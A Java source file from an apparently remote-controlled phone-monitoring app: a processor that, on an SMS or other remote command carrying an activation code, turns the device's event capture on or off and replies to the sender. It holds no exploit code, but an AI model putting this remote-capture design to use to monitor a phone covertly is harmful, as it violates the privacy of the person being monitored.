package com.vvt.remotecommandmanager.processor.miscellaneous;

import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefEventsCapture;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class EnableCaptureProcessor extends RemoteCommandProcessor {

	private static final String TAG = "EnableCaptureProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private LicenseInfo mLicenseInfo;
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private StringBuilder mReplyMessageBuilder;
	
	public EnableCaptureProcessor(AppContext appContext,FxEventRepository eventRepository, LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext,eventRepository);

		mLicenseInfo = licenseInfo;
		mPreferenceManager = preferenceManager;
		mReplyMessage = new ProcessingResult();
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		List<String> args = null;
		
		try {
		
			if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());			
			}
			else {
				args = commandData.getArguments();
			}
			if(LOGD) FxLog.d(TAG, "doProcessCommand # args : " + args.toString());
			
			boolean isEnabled = (Integer.parseInt(args.get(0).trim()) == 1 ? true : false);
			
			PrefEventsCapture  eventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
			eventsCapturePref.setEnableStartCapture(isEnabled);
        	mPreferenceManager.savePreferenceAndNotifyChange(eventsCapturePref);
        	
        	mReplyMessage.setIsSuccess(true);
        	
        	if(isEnabled) {
        		mReplyMessageBuilder.append(MessageManager.ENABLE_CAPTURE_ON);
        	}
        	else {
        		mReplyMessageBuilder.append(MessageManager.ENABLE_CAPTURE_OFF);
        	}
        	
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
         
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			 
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.ENABLE_CAPTURE_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 2 arguments.
			if(commandData.getArguments().size() != 2 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}


}
